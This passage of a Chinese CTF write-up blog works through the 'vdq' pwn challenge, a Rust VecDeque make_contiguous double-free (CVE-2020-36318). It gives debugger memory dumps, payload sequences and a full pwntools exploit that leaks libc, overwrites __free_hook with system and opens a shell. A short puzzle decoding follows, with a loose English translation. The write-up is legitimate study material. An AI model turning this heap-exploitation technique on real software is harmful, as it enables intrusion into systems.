<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">//容器成员<br>vdq::Note&#123;<br>    core::option::Option&lt;usize&gt; idx;<br>    alloc::vec::Vec&lt;u8&gt; msg;<br>&#125;<br></code></pre></td></tr></table></figure>

<p>首先如果使用如下payload测试其内存模型：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">[&quot;Add&quot;, &quot;Add&quot;, &quot;Add&quot;, &quot;Add&quot;]<br></code></pre></td></tr></table></figure>

<p>当添加第 [4] 个 message 的时候，会用其他函数拓展容器的缓冲区，内存变化如下：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">#Add note [3] with message : <br>pwndbg&gt; x /10gx 0x7fffffffd930<br>0x7fffffffd930:    0x0000000000000000  0x0000000000000003<br>0x7fffffffd940:    0x00005555555d7e40  0x0000000000000004<br>pwndbg&gt; x /10gx 0x00005555555d7e40<br>0x5555555d7e40:    0x00005555555d7e90  0x00005555555d7ee0<br>0x5555555d7e50:    0x00005555555d7f30  0x0000000000000000<br><br>#Add note [4] with message : <br>#注意到 VecDeque::buf 的地址已经变化<br>pwndbg&gt; x /10gx 0x7fffffffd930<br>0x7fffffffd930:    0x0000000000000000  0x0000000000000004<br>0x7fffffffd940:    0x00005555555d7fb0  0x0000000000000008<br>pwndbg&gt; x /10gx 0x00005555555d7fb0<br>0x5555555d7fb0:    0x00005555555d7e90  0x00005555555d7ee0<br>0x5555555d7fc0:    0x00005555555d7f30  0x00005555555d7f80<br>0x5555555d7fd0:    0x0000000000000000  0x0000000000000000<br>0x5555555d7fe0:    0x0000000000000000  0x0000000000000000<br></code></pre></td></tr></table></figure>

<p>现在大致就能够明白整个Deque的内存模型了：</p>
<ul>
<li>初始化阶段会开辟大小为 4 的buf，当其装满时则将大小翻倍</li>
<li>队首是指向高位的 index ，队尾则指向低位的 index</li>
<li>当index到达最大值时会进行回绕；但如果回绕的head再一次越过tail，就表明容器装满了，会再次拓展</li>
<li>入队和出队都只是将 head 或 tail 进行加减运算罢了，并不会立即释放</li>
</ul>
<p>接下来实际调试一下上述poc，当View触发之后，容器的内存如下：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">#VecDeque<br>pwndbg&gt; x /10gx 0x7fffffffd940<br>0x7fffffffd940:    0x0000000000000001  0x0000000000000004<br>0x7fffffffd950:    0x00005555555d7e80  0x0000000000000004<br>0x7fffffffd960:    0x00005555555d7fa0  0x0000000000000004<br><br>#VecDeque::buf<br>pwndbg&gt; x /10gx 0x00005555555d7e80<br>0x5555555d7e80:    0x00005555555d7f20  0x00005555555d7ff0<br>0x5555555d7e90:    0x00005555555d7f20  0x00005555555d7f20<br>0x5555555d7ea0:    0x00005555555d7f70  0x0000000000000021<br></code></pre></td></tr></table></figure>

<p>tail&#x3D;1；<br>head&#x3D;4；<br>其中buf[2] &#x3D;&#x3D; buf[3];<br>那么在释放该容器时，就会因为两者buf[2]和buf[3]都被认为是合法的容器而导致错误。事实也确实如此，如果我们在最后添加一个 View ，那么就会打印出两次相同内容：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">Cached notes:<br>-&gt; 4<br>-&gt; 5<br>-&gt; 5<br></code></pre></td></tr></table></figure>

<p>既然已经明白了触发double free的原因，接下来适当构造 payload 来进行任意地址写就算成功了。</p>
<p>但还有一个疑点：</p>
<ul>
<li><strong>make_contiguous</strong> 到底做了什么？ 或许直接看源代码就能解决问题，但并不是每次都有代码可查。至少笔者本次甚至没意识到程序是由 rust 所写，以及即便知道，也很难得知版本对应的漏洞和commit。因此本次还是直接通过调试来确定其逻辑。（这种方法是有条件的，因为本题的漏洞属于逻辑漏洞，因此我们只需要通过调试理解其执行逻辑即可；但有些漏洞则是细节上的设计问题，对于这类问题，调试就不那么有效了）</li>
</ul>
<p>注：</p>
<ul>
<li>其实还是有办法找到的，关键字：[rust,cve,make_contiguous]</li>
<li>直接搜索就能找到 <strong>CVE-2020-36318</strong> ，并能在commit中找到具体的最小poc</li>
</ul>
<p>笔者根据上述内容适当改了改payload，然后将断点打在 <strong>make_contiguous</strong> 处：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">[&quot;Add&quot;, &quot;Add&quot;, &quot;Add&quot;,&quot;Remove&quot;, &quot;Remove&quot;, &quot;Add&quot;, &quot;View&quot;]<br></code></pre></td></tr></table></figure>

<p>此时的容器内存布局：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">#before<br>pwndbg&gt; x /10gx 0x7fffffffd930<br>0x7fffffffd930:    0x0000000000000002  0x0000000000000000<br>0x7fffffffd940:    0x00005555555d7e60  0x0000000000000004<br><br>pwndbg&gt; x /10gx 0x00005555555d7e60<br>0x5555555d7e60:    0x00005555555d7eb0  0x00005555555d7f00<br>0x5555555d7e70:    0x00005555555d7f50  0x00005555555d7f00<br><br>#after<br>pwndbg&gt; x /10gx 0x7fffffffd930<br>0x7fffffffd930:    0x0000000000000000  0x0000000000000002<br>0x7fffffffd940:    0x00005555555d7e60  0x0000000000000004<br><br>pwndbg&gt; x /10gx 0x00005555555d7e60<br>0x5555555d7e60:    0x00005555555d7f50  0x00005555555d7f00<br>0x5555555d7e70:    0x00005555555d7f50  0x00005555555d7f00<br></code></pre></td></tr></table></figure>

<p>在发生地址回绕之后，调用 <strong>make_contiguous</strong> 会将实际在用的数据向前重新对齐。本例中就将 buf[2] 与 buf[3] 重新拷贝到了 buf[0] 和 buf[1] 的位置，同时修改 head 和 tail 的值使其正确。<br>但需要注意，本例有些不明确。笔者在后续调试中验证了得到了如下结论：</p>
<ul>
<li>如果 tail &lt; head，则无事发生</li>
<li>如果 tail &gt; head，就将 tail 到 head 之间的切片拼接到当前 head 位置</li>
</ul>
<p>综上，我们最终能够明白poc之所以会导致崩溃的原因是：</p>
<ul>
<li>首先是 head 第一次回绕，同时在第一个单元留下合法数据</li>
<li>而第一次 make_contiguous ，因为此时 head&#x3D;1，导致其整合时越过了第一个单元，使得 head 超出 Size 却没有回绕</li>
<li>此时再次 Add 使其回绕，但由于其回绕是通过取余的方式，因此使得再次 head&#x3D;1</li>
<li>但由于容器本身的 Size 并未变化，因此 buf[0] 的数据仍然起效，每次 make_contiguous 都会正常拷贝其地址，以至于此时 tail 与 tail 间多出了几个相同的地址，因此释放时触发了 double free</li>
</ul>
<p>事后查阅了源代码也可以看见，原函数此处是直接返回一个切片，但由于并未考虑到索引回绕的问题，因此才会导致上述错误。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">-  return unsafe &#123; &amp;mut self.buffer_as_mut_slice()[tail..head] &#125;;//此处直接返回了切片<br>+  return unsafe &#123; RingSlices::ring_slices(self.buffer_as_mut_slice(), head, tail).0 &#125;;<br></code></pre></td></tr></table></figure>

<h4 id="Attack-Test-1"><a href="#Attack-Test-1" class="headerlink" title="Attack Test"></a>Attack Test</h4><p>因为 <strong>make_contiguous</strong> 会将 tail 到 head 间的元素拷贝到 head 处，同时将 head 增加对应数量，但其增值并不会回绕，而会越过 Size，只要保证此时 head 不去变动，那么之后执行 Remove 也不会导致 tail 越过 head，再尝试 View 时则会因为 UAF 泄露地址。</p>
<p>payload 1：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">[&quot;Add&quot;, &quot;Add&quot;, &quot;Add&quot;, &quot;Remove&quot;, &quot;Add&quot;, &quot;Remove&quot;, &quot;Add&quot;, &quot;View&quot;,&quot;Remove&quot;, &quot;Remove&quot;, &quot;Remove&quot;, &quot;View&quot;]<br></code></pre></td></tr></table></figure>

<p>在最开始的 Add 中混入一个极大的内容，使得其被释放以后会被装入 Unsorted Bin ，然后在第一次 View 时使 head 越界，然后通过 Remove 使得 tail 回绕，那么再用 View 就会泄露 libc_Base 了。</p>
<p>接下来需要构造 UAF ，通过 Append 写 free_hook：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs plaintext"> &quot;Add&quot;, &quot;Add&quot;, &quot;Add&quot;,&quot;Add&quot;,&quot;Archive&quot;,&quot;Archive&quot;,&quot;Remove&quot;, &quot;Remove&quot;, &quot;Add&quot;, &quot;Add&quot;, &quot;Add&quot;,&quot;Add&quot;,&quot;Add&quot;,&quot;Add&quot;,&quot;View&quot;,<br>&quot;Remove&quot;,&quot;Remove&quot;,&quot;Remove&quot;,&quot;Remove&quot;,&quot;Archive&quot;,&quot;Remove&quot;, &quot;View&quot;<br></code></pre></td></tr></table></figure>

<p>最精巧的是，上述payload会让容器内存状态如下，payload 2：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs plaintext"> #before View<br> pwndbg&gt; x/10gx 0x7ffdf0176b80<br>0x7ffdf0176b80:    0x0000000000000004  0x0000000000000002<br>0x7ffdf0176b90:    0x000055a6952062e0  0x0000000000000008<br><br>pwndbg&gt; x/10gx 0x000055a6952062e0<br>0x55a6952062e0:    0x000055a695206770  0x000055a6952067c0<br>0x55a6952062f0:    0x000055a6952062b0  0x000055a6952062b0<br>0x55a695206300:    0x000055a6952061e0  0x000055a695206210<br>0x55a695206310:    0x000055a695206260  0x000055a695205e60<br><br>#after<br>pwndbg&gt; x/10gx 0x7ffdf0176b80<br>0x7ffdf0176b80:    0x0000000000000002  0x0000000000000008<br>0x7ffdf0176b90:    0x000055a6952062e0  0x0000000000000008<br><br>pwndbg&gt; x/10gx 0x000055a6952062e0<br>0x55a6952062e0:    0x000055a695206770  0x000055a6952067c0<br>0x55a6952062f0:    0x000055a6952061e0  0x000055a695206210<br>0x55a695206300:    0x000055a695206260  0x000055a695205e60<br>0x55a695206310:    0x000055a695206770  0x000055a6952067c0<br></code></pre></td></tr></table></figure>

<p>最终在通过 <strong>make_contiguous</strong> 的整合以及 Remove 的回绕，将0x000055a6952067c0释放，并能够在之后通过 Append 写此处地址。</p>
<p>payload 3：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">&quot;Append&quot;,&quot;Archive&quot;,&quot;Append&quot;,&quot;Add&quot;<br></code></pre></td></tr></table></figure>

<p>这里有一个一直没有注意到的可以利用的点，<strong>Append</strong> 操作中会调用 <strong>get_raw_line</strong> ，该函数会申请一块内存用以存放我们的输入。此时的 Bin 状态如下：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">0x30 [  5]: 0x55a6952067c0 —▸ 0x55a695206260 —▸ 0x55a695206210 —▸ 0x55a6952061e0 —▸ 0x55a6952062b0 ◂— 0x0<br></code></pre></td></tr></table></figure>

<p>它会申请 <strong>0x55a6952067c0</strong> 处内存并向内储存数据。<br>现在您可以已经发现了，在我们控制 0x55a6952067c0 的内存指向之后，再对其调用 <strong>Append</strong> 就能够任意地址写了。</p>
<p>闲言：</p>
<ul>
<li>事实上，笔者在发现漏洞上并没有太多疑问，但却在漏洞利用上花了非常多时间。笔者最开始不打算参照 wp 中的 payload 去做，本想着能不能靠自己独立写出，但经过了非常长时间的搏斗，不得不说出题人对本题的理解真的好深，最后一次 make_contiguous 时需要的状态笔者在尝试自行构造时花了非常多时间也只能构造出差不多的样子，但完全不如出题人所用的那样优雅</li>
<li>不过也可能只是我对 rust 不太熟悉的缘故吧，还是太菜了</li>
</ul>
<p>my exp：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">from pwn import *<br>context.log_level = &quot;debug&quot;<br>p=process(&quot;./vdq&quot;)<br><br>pay = &#x27;&#x27;&#x27;[<br>    &quot;Add&quot;, &quot;Add&quot;, &quot;Archive&quot;, &quot;Add&quot;, &quot;Archive&quot;, &quot;Add&quot;, &quot;Add&quot;, &quot;View&quot;, &quot;Remove&quot;, &quot;Remove&quot;, &quot;Remove&quot;, &quot;View&quot;,<br><br>    &quot;Add&quot;, &quot;Add&quot;, &quot;Add&quot;,&quot;Add&quot;,&quot;Archive&quot;,&quot;Archive&quot;,&quot;Remove&quot;, &quot;Remove&quot;, &quot;Add&quot;, &quot;Add&quot;, &quot;Add&quot;,&quot;Add&quot;,&quot;Add&quot;,&quot;Add&quot;,&quot;View&quot;,<br>    &quot;Remove&quot;,&quot;Remove&quot;,&quot;Remove&quot;,&quot;Remove&quot;,&quot;Archive&quot;,&quot;Remove&quot;, &quot;View&quot;,<br>    &quot;Append&quot;,&quot;Archive&quot;,&quot;Append&quot;,&quot;Add&quot;<br>]<br>$&#x27;&#x27;&#x27;<br>p.sendlineafter(&#x27;!\n&#x27;,pay)<br>p.sendlineafter(&#x27;: \n&#x27;,&#x27;a&#x27;*0x80)<br>p.sendlineafter(&#x27;: \n&#x27;,&#x27;a&#x27;*0x80)<br>p.sendlineafter(&#x27;: \n&#x27;,&#x27;1&#x27;*0x410)<br>p.sendlineafter(&#x27;: \n&#x27;,&#x27;a&#x27;*0x80)<br>p.sendlineafter(&#x27;: \n&#x27;,&#x27;a&#x27;*0x80)<br><br>p.recvuntil(&#x27;Cached notes:&#x27;)<br>p.recvuntil(&#x27;Cached notes:&#x27;)<br>p.recvuntil(&#x27; -&gt; &#x27;)<br>p.recvuntil(&#x27; -&gt; &#x27;)<br>leak_arena=0<br>for i in range(8):<br>    leak_byte=int(p.recv(2),0x10)<br>    leak_arena+=leak_byte&lt;&lt;(i*8)<br><br>print(hex(leak_arena))<br><br>base=leak_arena-(0x7f57fd2b3ca0-0x7f57fcec8000)<br>p.success(&#x27;base:&#x27;+hex(base))<br>__free_hook=base+0x7ff2888cb8e8-0x7ff2884de000<br>p.success(&#x27;__free_hook:&#x27;+hex(__free_hook))<br>system=base+0x7ffff7617420-0x7ffff75c8000<br>p.success(&#x27;system:&#x27;+hex(system))<br><br>for i in range(10):<br>    p.sendlineafter(&#x27;: \n&#x27;,&#x27;&#x27;)<br><br>p.sendlineafter(&#x27;: \n&#x27;,flat([0,0,__free_hook-0xa,0x3030303030303030]))<br>p.sendlineafter(&#x27;: \n&#x27;,p64(system))<br>p.sendlineafter(&#x27;: \n&#x27;,&#x27;/bin/sh\0&#x27;)<br>p.interactive()<br></code></pre></td></tr></table></figure>

<h2 id="MISC"><a href="#MISC" class="headerlink" title="MISC"></a>MISC</h2><h3 id="Plain-Text"><a href="#Plain-Text" class="headerlink" title="Plain Text"></a>Plain Text</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">dOBRO&amp;nbsp;POVALOWATX&amp;nbsp;NA&amp;nbsp;MAT^,&amp;nbsp;WY&amp;nbsp;DOLVNY&amp;nbsp;PEREWESTI&amp;nbsp;\TO&amp;nbsp;NA&amp;nbsp;ANGLIJSKIJ&amp;nbsp;QZYK.&amp;nbsp;tWOJ&amp;nbsp;SEKRET&amp;nbsp;SOSTOIT&amp;nbsp;IZ&amp;nbsp;DWUH&amp;nbsp;SLOW.&amp;nbsp;wSE&amp;nbsp;BUKWY&amp;nbsp;STRO^NYE.&amp;nbsp;qBLO^NYJ&amp;nbsp;ARBUZ.&amp;nbsp;vELAEM&amp;nbsp;WAM&amp;nbsp;OTLI^NOGO&amp;nbsp;DNQ.<br></code></pre></td></tr></table></figure>

<p>好像是读音，找个键盘表翻译一下就能拿到原文：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">дОБРО&amp;nbsp;ПОВАЛОШАТХ&amp;nbsp;НА&amp;nbsp;МАТ^,ШЫ&amp;nbsp;ДОЛВНЫ&amp;nbsp;ПЕРЕШЕСТИ&amp;nbsp;эТО&amp;nbsp;НА&amp;nbsp;АНГЛИЙСКИЙ&amp;nbsp;ЯЗЫК.&amp;nbsp;тШОЙ&amp;nbsp;СЕКРЕТ&amp;nbsp;СОСТОИТ&amp;nbsp;ИЗ&amp;nbsp;ДШУЧ&amp;nbsp;СЛОШ.шСЕ&amp;nbsp;БУКШЫ&amp;nbsp;СТРО^НЫЕ.яБЛО^НЫЙ&amp;nbsp;АРБУЗ.&amp;nbsp;вЕЛАЕМ&amp;nbsp;ШАМ&amp;nbsp;ОТЛИ^НОГО&amp;nbsp;ДНЯ.<br></code></pre></td></tr></table></figure>

<p>翻译成英文即可找到flag：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">WELCOME TO MATH^, WE SHOULD TRANSITION THIS TO ENGLISH. YOUR SECRET CONSISTS OF SLOW SHORT.<br>APPLE ^ WATERMELON.<br>WE HAVE A GREAT DAY.<br></code></pre></td></tr></table></figure>

<hr>
<p>插画ID：96449673</p>
<div id="paginator"></div></div><div id="post-footer"><div id="pages"><div class="footer-link" style="width: 50%;text-align:right;border-right:1px #fe2 solid"><a href="/2022/03/29/smoke-joke/">← 下一篇 烟灰色戏言</a></div><div class="footer-link" style="width: 50%;right:1px;border-left:1px #fe2 solid"><a href="/2022/03/17/d3ctf-pwn/">D3CTF-PWN复现报告 上一篇 →</a></div></div></div></div><div class="bottom-btn"><div><a class="i-top" id="to-top" onClick="scrolls.scrolltop();" title="回到顶部" style="opacity: 0; display: none;">∧ </a><a class="i-index" id="to-index" href="#toc-div" title="文章目录">≡</a><a class="i-color" id="color-mode" onClick="colorMode.change()" title="切换主题"></a></div></div></article><aside><div id="about"><a href="/" id="logo"><img src="/img/faction/6.png" alt="Logo"></a><h1 id="Dr"><a href="TokameinE">TokameinE</a></h1><div id="description"><p></p></div><div id="social-links"><a class="social" target="_blank" rel="noopener" href="https://github.com/ErodedElk"><i class="fab fa-github" alt="GitHub"></i></a><a class="social" target="_blank" rel="noopener" href="https://space.bilibili.com/1782544616"><i class="fa-brands fa-bilibili" alt="BiliBili"></i></a></div></div><div id="aside-block"><div id="toc-div"><h1>目录</h1><ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%89%8D%E8%A8%80"><span class="toc-number">1.</span> <span class="toc-text">前言</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#REV"><span class="toc-number">2.</span> <span class="toc-text">REV</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#fpbe"><span class="toc-number">2.1.</span> <span class="toc-text">fpbe</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%89%A7%E8%A1%8C%E9%80%BB%E8%BE%91"><span class="toc-number">2.2.</span> <span class="toc-text">执行逻辑</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#PWN"><span class="toc-number">3.</span> <span class="toc-text">PWN</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#babygame"><span class="toc-number">3.1.</span> <span class="toc-text">babygame</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#gogogo"><span class="toc-number">3.2.</span> <span class="toc-text">gogogo</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#mva"><span class="toc-number">3.3.</span> <span class="toc-text">mva</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E7%A8%8B%E5%BA%8F%E5%88%86%E6%9E%90"><span class="toc-number">3.3.1.</span> <span class="toc-text">程序分析</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90"><span class="toc-number">3.3.2.</span> <span class="toc-text">漏洞分析</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Attack-Test"><span class="toc-number">3.3.3.</span> <span class="toc-text">Attack Test</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#vdq"><span class="toc-number">3.4.</span> <span class="toc-text">vdq</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E9%80%BB%E8%BE%91%E5%88%86%E6%9E%90"><span class="toc-number">3.4.1.</span> <span class="toc-text">逻辑分析</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%A8%A1%E7%B3%8A%E6%B5%8B%E8%AF%95"><span class="toc-number">3.4.2.</span> <span class="toc-text">模糊测试</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%8A%9F%E8%83%BD%E5%88%86%E6%9E%90"><span class="toc-number">3.4.3.</span> <span class="toc-text">功能分析</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E8%B0%83%E8%AF%95%E5%88%86%E6%9E%90"><span class="toc-number">3.4.4.</span> <span class="toc-text">调试分析</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Attack-Test-1"><span class="toc-number">3.4.5.</span> <span class="toc-text">Attack Test</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#MISC"><span class="toc-number">4.</span> <span class="toc-text">MISC</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Plain-Text"><span class="toc-number">4.1.</span> <span class="toc-text">Plain Text</span></a></li></ol></li></ol></div></div><footer><nobr>构建自 <a target="_blank" rel="noopener" href="http://hexo.io">Hexo</a></nobr><wbr><nobr> 使用主题 <a target="_blank" rel="noopener" href="https://github.com/Yue-plus/hexo-theme-arknights">Arknights</a></nobr><wbr><nobr> 主题作者 <a target="_blank" rel="noopener" href="https://github.com/Yue-plus">Yue_plus</a></nobr></footer></aside></main><canvas id="canvas-dust"></canvas><script src="/js/search.js"></script><script src="/js/arknights.js"></script><script src="//unpkg.com/lightgallery@2.7.1/lightgallery.min.js"></script><script src="//unpkg.com/lightgallery@2.7.1/plugins/zoom/lg-zoom.min.js"></script><script src="//unpkg.com/lightgallery@2.7.1/plugins/thumbnail/lg-thumbnail.min.js"></script><script src="/js/pjax.js"></script><script class="pjax-js">reset= () => {document.querySelector('.lg-container')?.remove()
lightGallery(document.getElementById('post-bg'), {
  plugins: [lgZoom,lgThumbnail],
  selector: '.item-img'})}</script><script>window.addEventListener("load",() => {pjax = new Pjax({
 cacheBust: false,
 selectors: ['title','article','#aside-block','.pjax-js'],
 switches: {'article': Pjax.switches.sideBySide},
 switchesOptions: {
   'article': {
     classNames: {
       remove: "pjax-out",
       add: "pjax-in"
     }
   }
 }
});
document.addEventListener("pjax:complete", reset);reset()})</script></body></html>